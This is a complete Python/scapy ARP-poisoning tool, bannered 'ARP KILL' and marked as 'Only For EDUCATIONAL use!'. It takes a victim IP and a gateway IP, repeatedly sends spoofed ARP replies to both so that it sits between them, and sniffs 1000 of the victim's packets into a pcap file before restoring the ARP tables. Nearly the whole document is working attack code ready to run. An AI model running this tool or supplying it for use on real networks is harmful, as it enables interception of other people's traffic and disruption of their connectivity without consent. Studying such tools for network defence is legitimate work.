

from scapy.all import ARP, srp, Ether, conf, sendp, wrpcap, sniff
import sys
import threading
import time



def banner():
    print(r"""
     █████╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗     ██╗     
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██║██║     ██║     
    ███████║██████╔╝██████╔╝█████╔╝ ██║██║     ██║     
    ██╔══██║██╔═══╝ ██╔═══╝ ██╔═██╗ ██║██║     ██║     
    ██║  ██║██║     ██║     ██║  ██╗██║███████╗███████╗
    ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
               ARP KILL  -  Disconnect Devices
    """)
    print("Author: Aliakbar Babayev | Only For EDUCATIONAL use!\n")



def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10, verbose=False)
    for s, r in responses:
        return r[Ether].src
    return None     



def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    ether_target = Ether(dst=target_mac)

    poison_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    ether_gateway = Ether(dst=gateway_mac)

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    try:
        while True:
            sendp(ether_target/poison_target, verbose=False)
            sendp(ether_gateway/poison_gateway, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print("[*] ARP poison attack finished.")



def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target ...")
    sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, pdst=target_ip,
         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, verbose=False)
    sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, pdst=gateway_ip,
         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5, verbose=False)
    sys.exit(0)



if __name__ == "__main__":
    banner()

    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <victim_ip> <gateway_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = "wlan0"
    packet_count = 1000

    conf.iface = interface
    conf.verb = 0

    print(f"[*] Setting up {interface}")

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!!!] Failed to get gateway MAC. Exiting.")
        sys.exit(0)
    else:
        print(f"[*] Gateway {gateway_ip} is at {gateway_mac}")

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("[!!!] Failed to get target MAC. Exiting.")
        sys.exit(0)
    else:
        print(f"[*] Target {target_ip} is at {target_mac}")

    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()


    try: 

        print(f"[*] Starting sniffer for {packet_count} packets")
        bpf_filter = "ip host %s" % target_ip
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
        wrpcap('bhp.pcap', packets)
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
